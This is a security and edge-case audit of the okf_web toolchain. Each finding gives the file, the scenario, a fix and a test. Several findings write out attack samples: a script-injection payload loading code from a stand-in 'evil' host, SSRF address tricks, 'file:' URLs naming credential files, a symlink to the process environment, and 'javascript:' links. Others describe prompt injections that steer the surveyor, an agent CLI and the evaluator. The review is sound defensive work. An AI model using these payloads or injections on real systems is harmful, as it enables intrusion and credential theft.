# Edge-case review: UI, automation, security

A review of the open toolchain (`okf_web`, this repository at `482dcf5`,
2026-09-14/15) for the edge cases that hurt three things: the operator's
experience (clean, simple logic in the CLI and the rendered pages),
unattended automation (cron and CI), and security. Every finding below
was either reproduced against a scratch copy of the example bundle or
read unambiguously in the code; each names its file and line, the
concrete input or state that goes wrong, the fix, and the test that
pins it. The implementation plan at the end groups the fixes into five
phases, E1 to E5, in the order they should land. Nothing in this
document is implemented yet.

The hosted edition has its own review, `docs/HOSTED-EDGE-CASES.md` in
that repository, covering the service layer; the phases here are picked
into it as they land, in the standing way.

## 0. Method and scope

Four review passes, each a separate reading of the code with its own
reproductions: the CLI and its pages for operator logic; the same code
for cron and CI behavior; the security surface (the MCP bridge and its
capability execution, signing, the subscription LLM path, frontmatter
parsing, the surveyor's write gate, feed ingestion, the fetchers, the
rendered pages); and, in the hosted repository, the service layer. The
existing test suite (241 tests) was read first so that nothing already
covered is reported. Findings the suite already prevents, and defenses
found working, are listed at the end of each section rather than
counted.

Severity means: **high**, data loss, a wrong published artifact, or a
network pivot with a plausible trigger; **medium**, wrong results or a
stuck automation under ordinary conditions; **low**, needs an unusual
precondition or has a small blast radius.

## 1. Findings at a glance

| ID | Area | Severity | One line |
| --- | --- | --- | --- |
| U1 | UI | high | `publish` deletes whatever the dist path names: the bundle itself, the working directory, an unrelated directory |
| U2 | UI | high | A mistyped bundle path lints clean, reviews clean, drifts clean, and publishes a dist from nothing |
| U3 | UI | high | `questions --llm` overwrites a curated pack without asking, and empties it when the model answers in prose |
| A1 | Automation | high | A dist written inside the bundle is loaded as concepts on the next run |
| S1 | Security | high | The bridge's private-host guard misses shorthand IP literals, names resolving privately, and redirects |
| S2 | Security | high | JSON-LD output does not neutralize `</script>`, and merchants are told to paste it into pages |
| S3 | Security | medium | The surveyor's write gate lets model output overwrite unowned concepts, including the scorecard, and plant translations |
| S4 | Security | medium | `publish` and the loader follow symlinks, so a planted link ships an outside file in the signed dist |
| S5 | Security | medium | The surveyor, sitemap reader and discover verifier fetch any scheme (`file:`) and any host |
| S6 | Security | medium | The subscription path pipes untrusted page text into an agent CLI with its tools enabled |
| U4 | UI | medium | `batch-approve` approves rejected drafts, deletes their rejection reasons, and ignores `--risk` |
| U5 | UI | medium | Approving a stale concept leaves it pending forever; approving twice duplicates the record |
| U6 | UI | medium | The feed importer misreads a BOM, a comma-rich TSV, renamed columns and variants sharing one link |
| U7 | UI | medium | The most common operator mistakes end in Python tracebacks |
| U8 | UI | medium | `okf-web view .` inside the bundle is published next time, as are stray feed files |
| A2 | Automation | medium | Publish warnings go to stdout with exit 0; `drift` cannot tell "changed" from "unreachable" |
| A3 | Automation | medium | `evaluate` always exits 0, and a dry run can overwrite the judged scorecard |
| A4 | Automation | medium | One page with a bad charset aborts a whole survey; an HTML sitemap reports "no inputs" |
| A5 | Automation | medium | Freshness, lint and the log use the host's local date against UTC stamps |
| S7 | Security | low | Every fetcher reads responses without a size cap |
| S8 | Security | low | The parse cache is trusted on modification time and size, and a hostile entry crashes the loader |
| S9 | Security | low | `resource` accepts any scheme, so a `javascript:` link reaches the viewer, the linkmap and the JSON-LD |
| S10 | Security | low | `verify` reads manifest-listed paths without containment |
| S11 | Security | low | Evaluation context splices concept bodies between angle-bracket tags unescaped |
| U9 | UI | low | A misspelled `status` lints clean and is withheld without saying why |
| A6 | Automation | low | No write is atomic, no mutating command takes a lock, and quarantine names collide within a second |
| A7 | Automation | low | CI tests one Python version, and nothing asserts the two version strings agree |

## 2. Security findings

### S1 · The private-host guard is bypassed by shorthand literals, private DNS, and redirects (high)

- **Where**: `src/okf_web/mcp_bridge.py:66-83` (`_is_private_host`), `:57-61` (`_http_get`), `:245-253` (the guard runs on the pre-redirect literal host only).
- **Scenario**: a capability concept declares `executor.resource: http://2130706433/price?sku={sku}`, or `http://127.1/`, `http://0x7f000001/`, `http://017700000001/`, `http://0/`, or the metadata address in decimal. `ipaddress.ip_address()` rejects those spellings, so the guard returns False and the bridge fetches; the resolver maps every one of them to loopback or the metadata service. Separately, a permitted public endpoint that answers `302 Location: http://127.0.0.1:8321/…` is followed by urllib's default opener and the body goes back to the assistant. Reproduced: all five shorthand forms resolve to `127.0.0.1` or `0.0.0.0` while the guard says public; a loopback redirect returned the internal body. A public name that resolves to a private address passes too, which the docstring already admits. S3 makes this reachable from a surveyed page: a draft capability lands in `capabilities/` and executes under `okf-web mcp --working`.
- **Evidence**: `try: ip = ipaddress.ip_address(host) / except ValueError: return False`; `urllib.request.urlopen(request, timeout=timeout)` with no redirect handler.
- **Fix**: resolve the host with `socket.getaddrinfo` and refuse when any resolved address is loopback, private, link-local, reserved, multicast or unspecified (keep the literal check as the fast path); install an opener whose redirect handler re-applies the check, or refuse redirects and return the 3xx.
- **Test**: extend `test_execute_refuses_private_hosts` with the five shorthand forms and assert no fetch is attempted; with a loopback server that redirects to `127.0.0.1`, assert the real `_http_get` path refuses.

### S2 · JSON-LD output does not neutralize `</script>` (high)

- **Where**: `src/okf_web/structured.py:259` (`json.dumps(obj, indent=2, ensure_ascii=False)`); inputs at `:96`, `:119-120`, `:129`, `:185`; `docs/USER-GUIDE.md` Step 6 tells the merchant to add the files to their pages.
- **Scenario**: a supplier feed row titled `Tent</script><script src=//evil/x.js></script>` becomes a draft, passes a wholesale `human-batch:` sign-off (which by design does not read items), and `dist/jsonld/catalog/products/tent.json` contains a literal `</script>`. Pasted into `<script type="application/ld+json">`, the HTML parser closes the element early: stored script injection on the storefront. FAQ text, a store address, or text extracted from a hostile page behave the same. Reproduced: `jsonld_for()` serializes the sequence intact; `_plain()` strips only emphasis markers.
- **Fix**: post-process the serialized JSON so `<`, `>`, `&`, U+2028 and U+2029 become `\u` escapes (still valid JSON, inert inside a script element).
- **Test**: a `human-batch:` FAQ whose body contains `</script><script>` writes a `jsonld/*.json` with no `</script` substring, and `json.loads` of the file still yields the same object.

### S3 · The write gate trusts the model's choice of path and ownership (medium)

- **Where**: `src/okf_web/surveyor.py:330-341` (collision guard requires `occupant.resource`), `:344-353` (only `TRUST_HUMAN` diverts to a proposal; everything else is overwritten and re-stamped `draft`), `:202-209` (`_safe_rel_path` allows `evaluations/`, `l10n/`, `capabilities/`), `:272-273` (`resource` only defaulted, never pinned); `src/okf_web/model.py:531` (the localized overlay ignores trust and status).
- **Scenario A**: injected page text makes the model emit a concept block at `evaluations/geo-scorecard.md` with invented metrics. The scorecard has no `resource` and no `human:` entry, so it is overwritten; `okf-web report` and `okf-web view` then present the attacker's numbers as measured. Reproduced with the static client. **Scenario B**: the model emits `l10n/es/policies/returns.md`; `okf-web mcp --lang es` overlays the human-reviewed policy with the draft, the publisher withholds the draft, and the Spanish view has no returns policy. Reproduced. Also: a `human-batch:` stable concept without `resource` is demoted to a draft by any re-survey, and a model-supplied `resource` spoofs the ownership key that path stability and `linkmap.json` rely on. On Windows, backslash segments and drive letters would also pass `_safe_rel_path`.
- **Fix**: treat any existing concept not owned by the producer's URL (different or absent `resource`) as a collision; never overwrite `stable` content; restrict producer paths to content directories (deny `evaluations/`, `l10n/`, `capabilities/`, and check with `PureWindowsPath` too); always pin `fm["resource"] = url`.
- **Test**: the static client emitting the scorecard path and a `l10n/es/policies/returns.md` leaves the scorecard bytes unchanged, records a collision, and `build_state(lang="es").bundle.get("policies/returns.md")` is still the reviewed policy.

### S4 · `publish` and the loader follow symlinks (medium)

- **Where**: `src/okf_web/publisher.py:185-199` (`rglob`, `is_file()` and `copy2` all follow links); `src/okf_web/model.py:626`.
- **Scenario**: a contributor's change adds `assets/spec-sheet.txt -> /proc/self/environ` (git stores symlinks). The CI publish step copies the target, hashes it into `manifest.json`, signs it, and serves it under `/.well-known/okf/`. Reproduced: 7,415 bytes of environment published and listed. The same planted link makes in-bundle writes (`place_draft`, `Concept.save`, the report's default path) write through it.
- **Fix**: skip `is_symlink()` entries in the publisher and the loader, or require `path.resolve()` to stay under `bundle_root.resolve()`; refuse to write through a symlink.
- **Test**: a bundle copy with a symlink to a file outside the root publishes without it (or raises), and the dist contains no such file.

### S5 · Fetchers accept any scheme and any host (medium)

- **Where**: `src/okf_web/surveyor.py:109-113` (`fetch` is a bare `urlopen`), `:134` (nested sitemap locations fetched verbatim), `:367`; `src/okf_web/discover.py:128-131` (the `<link rel="okf-bundle">` pointer is resolved and fetched from any origin). `drift.py` already checks the scheme.
- **Scenario**: a sitemap index, a nested sitemap, or a `--urls` line contains `file:///home/me/.aws/credentials`; urllib's file handler returns it, the surveyor sends it to the LLM as page text and writes it under `_quarantine/` or a draft. Reproduced: `fetch("file:///etc/hostname")` returned the file; `discover_sitemap` over a `file:` base returned a `file:` location. `okf-web discover` against a page whose pointer names `http://10.0.0.5:8500/` makes the auditor's machine request internal URLs.
- **Fix**: allow only `http` and `https` in `surveyor.fetch`, `discover_sitemap` and the discover pointer resolution, and reuse the bridge's private-host refusal (after S1) in all three.
- **Test**: `survey(["file:///etc/hostname"], …)` records an error and never calls the LLM; `discover_sitemap` drops non-http locations; `discover()` with a `file:` or private pointer records a problem and makes no fetch.

### S6 · The subscription path hands untrusted text to an agent CLI with tools (medium, consequence suspected)

- **Where**: `src/okf_web/llm.py:84-92` (system and user text concatenated onto stdin), `:114` (`["claude", "-p"]`, no tool restriction, no system-prompt flag, inherits the working directory).
- **Scenario**: `okf-web survey --sitemap … --llm claude-code` fetches a page whose user-generated text instructs the agent to read local credential files and put them in the overview. The agent runs with the operator's own tool permissions; the "page text is untrusted" rule sits in the same channel as the page. The argv and prompt construction are verified; what the CLI permits by default lives outside this repository, so the outcome is suspected, not demonstrated.
- **Fix**: invoke the CLI with its tool-disabling and system-prompt flags where the installed version supports them (probe once at startup), run it in an empty temporary working directory, and refuse the subscription path for `survey` with a clear message when the flags are unavailable.
- **Test**: `claude_code_client().command` carries the tool-disabling flag, and `complete()` passes the system text through the flag rather than stdin (argv captured with a fake executable, as `test_llm_clients.py` already does).

### S7 · Unbounded response reads (low)

- **Where**: `src/okf_web/mcp_bridge.py:61` (truncation at `:260` happens after the whole body is in memory), `surveyor.py:113`, `discover.py:45`, `publisher.py:339`; quadratic patterns in `model.py:59`, `structured.py:50`, `logscan.py:39-42`.
- **Scenario**: a capability endpoint or a surveyed page drip-feeds an endless chunked body; the timeout bounds each socket operation, not the total, so the single-threaded stdio bridge hangs and memory grows while the assistant waits.
- **Fix**: read at most the cap plus one byte (pages 5 MiB, robots 256 KiB, capability bodies 1 MiB) under a total deadline; bound line and body length before regex matching.
- **Test**: a loopback server streaming far past the cap returns at most the cap, or raises, within seconds.

### S8 · The parse cache is trusted on modification time and size (low)

- **Where**: `src/okf_web/model.py:636-647`, `:576-586`; `publisher.py:199` copies disk bytes.
- **Scenario**: a bundle delivered as an archive that preserves times and includes the hidden `.concepts-cache.json` holds the reviewed returns policy in the cache while the file on disk says the opposite at the same size. Lint, the viewer and the bridge show the clean text; `publish` ships the tampered file under the reviewer's attestation. Reproduced. A hostile cache entry also crashes `load_bundle` instead of degrading to a parse.
- **Fix**: key cache entries on a content hash of the file bytes (cheap next to YAML parsing) and treat any decode failure as a miss.
- **Test**: tamper a file while preserving time and size with `os.utime`; the loaded body reflects the disk; a corrupt entry produces a full parse and no exception.

### S9 · `resource` accepts any scheme (low)

- **Where**: `src/okf_web/viewer.py:480` (clickable `href`); `feed.py:191` (`resource: item.link`, unvalidated); `linter.py:480` (E012 checks presence only).
- **Scenario**: a feed row whose link is a `javascript:` URL lints clean, and the operator's `bundle-viewer.html` carries a clickable `javascript:` link; `linkmap.json` and the JSON-LD `url` carry it verbatim. `html.escape` cannot neutralize a scheme.
- **Fix**: lint `resource` and `sources[].resource` to `http(s)` (a new error code), and have the viewer link only `http(s)` values, printing anything else as text.
- **Test**: a product with `resource: javascript:alert(1)` produces a lint finding, and `build_viewer` output contains no `href="javascript:`.

### S10 · `verify` reads manifest-listed paths without containment (low)

- **Where**: `src/okf_web/signing.py:177-186`.
- **Scenario**: `okf-web verify` on a third-party dist whose manifest lists `../../../../etc/hostname` or an absolute path answers "missing" or "hash mismatch" for files outside the dist (an existence oracle, and an equality oracle for a guessed digest); a path naming a FIFO or `/dev/zero` hangs the verifier. Reproduced.
- **Fix**: reject any entry whose resolved path is not a regular file under the dist, and hash in chunks with the publisher's `_file_digest`.
- **Test**: a manifest with `../x` or an absolute path yields an "invalid manifest path" error and no read.

### S11 · Evaluation context splices bodies unescaped (low)

- **Where**: `src/okf_web/evaluator.py:379-382`; `prompts/evaluator_answer.md` and `evaluator_judge.md` carry no untrusted-data rule (`surveyor_extract.md` does).
- **Scenario**: a draft or batch-approved body containing `</concept>` followed by a forged `<concept path="/policies/returns.md" trust="human-reviewed">` block is retrieved; the answerer and judge see a trusted block that does not exist, and the inflated coverage is recorded and then displayed by the report and viewer as measured fact.
- **Fix**: neutralize `<concept` and `</concept>` sequences in rendered bodies (or use a per-run random delimiter), and add the data-not-instructions rule to both prompts.
- **Test**: a body containing the forged sequence yields a context with exactly one `<concept` per retrieved concept.

**Defenses found working**: `okf_get` is a dictionary lookup, so `..` and absolute paths never reach the filesystem; capability parameters are percent-encoded with nothing safe, undeclared arguments are ignored, and leftover placeholders are rejected; the bridge is GET-only; every YAML load is `safe_load`; the caches are JSON; both subprocess call sites use argument lists without a shell and the countersignature label is validated; the report and viewer escape text and attribute values, and log lines reach the viewer only through the fixed agent roster; permissive CORS on a public, credential-less bundle is appropriate.

## 3. UI findings (operator logic)

### U1 · `publish` deletes whatever the dist names (high)

- **Where**: `src/okf_web/publisher.py:179-181`; `src/okf_web/cli.py:956` (`init --dist` defaults to `dist`).
- **Scenario**: `okf-web publish my-store my-store`, `okf-web publish my-store .`, or `okf-web init` in a directory that already has an unrelated `dist/`. The target is removed recursively with no marker check and no confirmation. Reproduced: publishing the bundle into itself left 0 of its 25 concept files and printed "published 6 file(s)" with exit 0; an unrelated directory holding a file was wiped.
- **Fix**: refuse (exit 2) when the dist resolves to the bundle root, an ancestor or descendant of it, the working directory or home, or an existing non-empty directory without a previous `manifest.json`, unless `--force`.
- **Test**: `publish(root, root)`, `publish(root, root.parent)` and `publish(root, dir_with_file)` raise `PublishError` and leave everything intact.

### U2 · A missing bundle path is a clean bundle (high)

- **Where**: `src/okf_web/model.py:620-626` (no existence check before `rglob`); consumers `cli.py:89-98`, `:101-130`, `:393-406`, `publisher.py:141-146`.
- **Scenario**: a mistyped path in cron or CI. Reproduced: `lint no-such-dir --strict` prints `0 error(s), 0 warning(s)` and exits 0; `review list --fail-nonempty` exits 0; `drift` exits 0; `publish no-such-dir dist` exits 0 and creates a dist holding `manifest.json`, `llms.txt` and `linkmap.json` from nothing.
- **Fix**: `load_bundle` raises when the root is not a directory or holds no documents; every subcommand exits 2 naming the path.
- **Test**: `cli.main(["lint", "nope"])` returns 2 and prints the path; `publish("nope", dist)` raises before creating the dist.

### U3 · `questions --llm` overwrites a curated pack (high)

- **Where**: `src/okf_web/cli.py:259-279` (LLM branch) versus `:244-250` (the `--force` guard exists only in the `--pack` branch); `evaluator.py:345-352`.
- **Scenario**: the guide tells the operator to curate `evaluations/questions.yaml`; re-running `okf-web questions my-store --llm …` replaces it silently, and when the model answers in prose `_extract_yaml` returns nothing and the file becomes `questions: []`. Reproduced: 39 curated questions became zero, "wrote 0 questions", exit 0.
- **Fix**: apply the same `--force` guard to the LLM branch and exit 1 without writing when zero questions were parsed.
- **Test**: an existing pack without `--force` exits 2 with the file unchanged; a fake model returning prose exits 1 with the file unchanged.

### U4 · `batch-approve` approves rejected drafts and ignores `--risk` (medium)

- **Where**: `src/okf_web/review.py:143-160` (no check of `x_geo.review`), `:111-113` (approve pops the rejection), `src/okf_web/cli.py:131-137` (`args.risk` is never passed), `:796-798`.
- **Scenario**: a reviewer rejects a risk-`b` draft with a reason; later `review batch-approve --by bob --risk c` approves it as human-attested, deletes the reason, and also approves the risk-`b` drafts because the flag is silently ignored. There is no dry run. Reproduced.
- **Fix**: skip drafts carrying `x_geo.review.rejected_by` and report them; pass `--risk` through as the `risks` tuple; add `--dry-run`.
- **Test**: reject then batch-approve leaves the concept a draft with its review marker; `--risk c` leaves risk-`b` drafts untouched.

### U5 · Approving a stale concept leaves it pending; approving twice duplicates (medium)

- **Where**: `src/okf_web/review.py:69-70`, `:100-119`.
- **Scenario**: a concept is queued only because `stale_after` has passed; approving it never refreshes the date, so it stays in `review list` with the same reason. Re-running approve is not refused: two approvals produced three `verified` entries and three log bullets. Reproduced.
- **Fix**: when the concept is stale, require `--stale-after DATE` (or bump by the profile's class SLA); treat re-approval by the same actor as a no-op with a message.
- **Test**: approving a stale concept removes it from `pending()`; approving twice yields one `verified` entry.

### U6 · Feed importer edge cases (medium)

- **Where**: `src/okf_web/feed.py:98-99`, `:104-107`, `:124-126`, `:264-268`, `:270-273`; `surveyor.py:323-325`; `cli.py:486-498`, `:609` (`init`).
- **Scenario**: an Excel-style UTF-8 BOM makes the header key `﻿id`, so every product gets `entity: "sku:"` and a stray attribute line, and a BOM'd Merchant XML parses as zero items with no error; a TSV whose descriptions carry more commas than the file has tabs is sniffed as CSV and every row is "missing link or title"; renamed columns or an empty file produce per-row errors or a silent 0/0, and `init` prints "0 drafted, 1 error(s)", still publishes, and exits 0; variant rows sharing one link overwrite each other, so one file ends up holding another variant's title. Reproduced.
- **Fix**: read with `utf-8-sig`; sniff the delimiter on the header line only; validate required columns once and fail with "column X not found (have: …)"; reject or merge rows whose link was already seen in the feed; make `init` exit 1 when nothing was drafted.
- **Test**: a BOM CSV yields `item.id == "7"`; a comma-rich TSV yields items with links; a missing `link` column gives one header-level error and `init` exits 1; two rows with one link give one file plus a collision note.

### U7 · Common mistakes end in tracebacks (medium)

- **Where**: `src/okf_web/cli.py:149`, `:152`, `:164`, `:179`, `:1092-1094` (`main` has no exception mapping); `review.py:92-94`, `:166-168`; `feed.py:253-257`; `surveyor.py:137`.
- **Scenario**: tab-completing a concept path as `my-store/policies/warranty.md` or `./policies/warranty.md` raises `KeyError`; a mistyped `--feed` or `--urls` raises `FileNotFoundError`; a site whose sitemap is a 404 raises `HTTPError`. None says what to do next.
- **Fix**: normalize the concept path (strip the bundle prefix and `./`, suggest close matches), check input files exist before work, and have `main()` map known exception types to one-line messages with exit 2.
- **Test**: approving with the bundle-prefixed path returns 0, or 2 with a "did you mean" message, and never raises; a missing `--feed` exits 2 naming the path.

### U8 · Operator files inside the bundle get published (medium)

- **Where**: `src/okf_web/viewer.py:824` (default output is `bundle-viewer.html` in the working directory); `publisher.py:185-200` (every non-hidden non-markdown asset ships).
- **Scenario**: `cd my-store && okf-web view .` writes the viewer into the bundle; the next publish ships it, with draft titles and read-log tables, and lists it in the manifest. A `products.csv` left in the bundle, with `price` and `cost_of_goods_sold` columns, reaches the dist too, bypassing the live-values rule the importer enforces. Publish output never lists the non-concept assets it shipped. Reproduced.
- **Fix**: `view` refuses an output path that resolves inside the bundle; `publish` skips `bundle-viewer.html` and feed files (`*.csv`, `*.tsv`, feed XML), or requires an asset allowlist, and prints the assets it shipped.
- **Test**: `write_viewer(root, out=root / "x.html")` raises; a bundle containing `products.csv` publishes without it and the output names any shipped asset.

### U9 · A misspelled `status` lints clean (low)

- **Where**: `src/okf_web/linter.py` (no enumeration check on `status`); `model.py:186-188`; `publisher.py:84`; `cli.py:347-351`.
- **Scenario**: a hand edit sets `status: Stable`. Lint is 0/0, and publish withholds the concept under the message "drafts, expired promotions, or stale". E010 keys on the exact string, so a misspelled high-risk concept dodges the gate by accident.
- **Fix**: an error code for `status` outside `{draft, stable, deprecated}`, and the withheld line names the actual status.
- **Test**: `status: Stable` produces the finding; the withheld reason names the status.

**Not counted**: `review list --risk c` prints only the summary line when nothing matches; `init` prints an MCP config with a relative bundle path, which a desktop client cannot resolve.

## 4. Automation findings

### A1 · A dist inside the bundle becomes concepts (high)

- **Where**: `src/okf_web/model.py:626-629` (only `_review` and `_quarantine` are skipped); `publisher.py:141-152`, `:205-211`.
- **Scenario**: `okf-web publish my-store my-store/dist`. The next load treats `dist/**/*.md` as concepts: 22 became 43, lint stayed 0/0, the dry-run trust mix doubled, and the second publish wrote `jsonld/dist/…` objects and `llms.txt` links to paths that do not exist in the published set. Reproduced.
- **Fix**: refuse a dist inside the bundle root (U1's guard), and have the loader skip directories carrying a `.okf-dist` marker the publisher writes.
- **Test**: after `publish(root, root / "dist")`, `len(load_bundle(root).concepts)` is unchanged, or `publish` raises.

### A2 · Warnings on stdout with exit 0; drift's exit code conflates two states (medium)

- **Where**: `src/okf_web/cli.py:354-355`, `:372-390` (publish); `:406` and `drift.py:49-51`; `docs/DESIGN.md` §9.
- **Scenario**: a nightly publish ships a stale returns policy, an off-origin resource or a robots-blocked bundle; every warning goes to stdout and the exit is 0, with no `--fail-on-warnings`, `--quiet` or JSON. `drift` exits 1 for an unreachable page (timeout, 5xx, bad charset) exactly as for a changed one, while DESIGN §9 says non-zero means "these URLs changed", so a network blip pages the operator with a re-survey instruction. Reproduced.
- **Fix**: warnings to stderr plus `--fail-on-warnings`; distinct drift exit codes (1 drifted, 3 unreachable only) with the doc matching.
- **Test**: a stale concept with `--fail-on-warnings` exits 1; a fetcher that raises makes `drift` exit 3, not 1.

### A3 · `evaluate` cannot fail, and a dry run can erase a judged scorecard (medium)

- **Where**: `src/okf_web/cli.py:305-321`; `.github/workflows/okf-ci.yml:22-23`; `evaluator.py:190-202`, `:432-486`.
- **Scenario**: an empty pack (hit rate 0.0), duplicate ids and archetypes outside `ARCHETYPES` all pass, so the CI step named "retrieval coverage" cannot fail on coverage. `evaluate --dry-run --write-scorecard` replaces the judged scorecard: `coverage` vanished from `geo-scorecard.md` and the report flipped to "retrieval-only dry run" with no warning. Reproduced.
- **Fix**: add `--min-hit-rate` and `--min-coverage` (exit 1 below them); validate the pack (non-empty, unique ids, known archetypes, exit 2); refuse to replace a judged scorecard with a dry-run one without `--force`.
- **Test**: `evaluate --dry-run --min-hit-rate 0.9` on an empty pack exits 1; a dry-run `--write-scorecard` over a judged scorecard exits 2 with the file unchanged.

### A4 · One bad page aborts a survey; an HTML sitemap reads as "no inputs" (medium)

- **Where**: `src/okf_web/surveyor.py:112-113`, `:370-374` (only `OSError` is caught around the fetch); `:121-125`, `:137` and `cli.py:167-172`.
- **Scenario**: one page served with `charset=bogus` raises `LookupError`, which is not an `OSError`, so `survey()` aborts with a traceback after writing earlier drafts. A `--sitemap` host whose `/sitemap.xml` is a single-page-app fallback makes `discover_sitemap` swallow the parse error and the CLI says "no inputs: pass --sitemap" although it was passed. Reproduced.
- **Fix**: fall back to UTF-8 on `LookupError` and catch `Exception` per page; make `discover_sitemap` report "sitemap unparseable or empty" distinctly.
- **Test**: a fetcher raising `LookupError` yields one error entry and the other URLs proceed; an HTML sitemap produces a message naming the sitemap URL and exit 2.

### A5 · Local dates against UTC stamps (medium)

- **Where**: `src/okf_web/model.py:256`, `:385`; `linter.py:258`; `review.py:184`; `viewer.py:298`.
- **Scenario**: every stamp is a UTC instant, but every default clock is the host's local calendar date. Reproduced at 15:12Z with `stale_after: 2026-09-15T00:00:00Z`: under UTC+14 `is_stale()` is True while the spec says False, so `publish --freshness withhold` retires the concept nine hours early and the freshness warnings fire early; under UTC-12 they lag twelve hours. The log wrote a heading for the next day beside a same-day verification stamp.
- **Fix**: default every clock to `datetime.now(timezone.utc)` (`is_stale` already handles a datetime exactly) and derive the log day from the same instant.
- **Test**: with the local zone far from UTC and `stale_after` at the next UTC midnight, `is_stale()` is False, and the log heading equals the UTC date of the stamp.

### A6 · Nothing is atomic and nothing locks (low)

- **Where**: `src/okf_web/model.py:430` (`Concept.save`), `review.py:194-214` (log read-modify-write), `surveyor.py:349`, `:353`, `:385-389` (quarantine names), `evaluator.py:485`, `publisher.py:285`.
- **Scenario**: all writes are plain `write_text`; there is no `os.replace`, temporary file, or lock anywhere. A cron timeout or SIGTERM mid-save truncates a human-approved concept (next lint: E001; publish refuses) or the audit log; two overlapping nightly runs interleave writes. Reproduced: quarantine names are stamped to the second, so two bad blocks from one page in one second leave one file for "quarantined: 2".
- **Fix**: one shared write helper (temporary file plus `os.replace`), a `.okf-lock` in the bundle for mutating commands, and a counter or short hash in quarantine names.
- **Test**: a monkeypatched write that fails after partial output leaves the original concept parseable; two bad blocks yield two quarantine files; a second mutating command exits with "bundle is locked".

### A7 · CI blind spots (low)

- **Where**: `.github/workflows/okf-ci.yml` (Python 3.11 only against `requires-python >= 3.10`); `release.yml:26-30` checks only `pyproject.toml`'s version.
- **Fix**: a small version matrix, and a test asserting `okf_web.__version__` equals the packaged version.

## 5. Implementation plan

Five phases, in this order. Each is one commit on the designated branch behind the full verification loop, with the tests named above landing with the code, then picked into the hosted edition on the user's word. Sizes are relative: S is a morning, M a day, L two.

### E1 · Guardrails against data loss and mis-scoping (S)

Closes U1, U2, A1, U8, S4, S10. `publisher.publish` refuses a dist that is the bundle, contains it, sits inside it, or is a non-empty directory without a previous manifest (`--force` overrides the last case only); the publisher writes a `.okf-dist` marker and the loader skips marked directories; `load_bundle` raises a `BundleNotFound` error every command maps to exit 2; the publisher and loader skip symlinks; `view` refuses an output inside the bundle; publish skips the viewer page and feed files and prints the assets it shipped; `verify` contains manifest paths and hashes in chunks. Docs: USER-GUIDE Step 6 note on where the dist goes. First because it prevents destruction.

### E2 · Reachability hardening for the bridge and the fetchers (M)

Closes S1, S5, S7, S6. A shared `safe_fetch` in a new `okf_web/net.py`: scheme allowlist, resolver-based private-host refusal, redirect re-check, read cap and deadline; the bridge, surveyor, sitemap reader, discover verifier, drift checker and robots check all call it. The subscription client gains the tool-disabling and system-prompt flags with a startup probe and a clear refusal when unsupported. Tests run against loopback servers only. DESIGN §8 and the MCP section of DISTRIBUTION note the new refusals.

### E3 · Content integrity (M)

Closes S2, S3, S8, S9, S11. JSON-LD escaping in `structured.py`; the write gate treats unowned occupants as collisions, never overwrites stable content, confines producers to content directories, and pins `resource`; cache entries keyed by content hash with tolerant decoding; a lint error for non-http resources, and `http(s)`-only links in the viewer, linkmap and JSON-LD; concept delimiters neutralized in evaluation context and the data rule added to both evaluator prompts. GEO-PROFILE §9 gains the two new lint codes and a §10 note (no profile bump: lint vocabulary only).

### E4 · Operator clarity (M)

Closes U3, U4, U5, U6, U7, U9, A2, A3. `questions` guards every branch and refuses to write an empty pack; `batch-approve` skips rejected drafts, honors `--risk`, and gains `--dry-run`; `approve` requires a new freshness date for a stale concept and is idempotent per actor; the feed importer reads `utf-8-sig`, sniffs the header line, validates columns once, and handles shared links; `main()` maps known exceptions to one-line messages; the status enumeration lints; publish warnings go to stderr with `--fail-on-warnings`; drift's exit codes distinguish unreachable from changed; `evaluate` gains thresholds, pack validation, and the judged-scorecard guard. USER-GUIDE FAQ entries for each new refusal.

### E5 · Automation hygiene (S)

Closes A4, A5, A6, A7. Per-page exception isolation in `survey`; UTC clocks throughout; the atomic-write helper and the bundle lock; unique quarantine names; a CI matrix over the supported Python versions and a version-consistency test; `init` prints an absolute MCP path.

### Acceptance

Every phase: the verification loop (suite twice, lint 0/0, dry-run at the reference numbers) plus the phase's own tests; no measured number changes hand-edited; MEMORY updated in the same commit. After E1 to E5 the suite gains roughly forty tests. The reference bundle and the profile do not change.
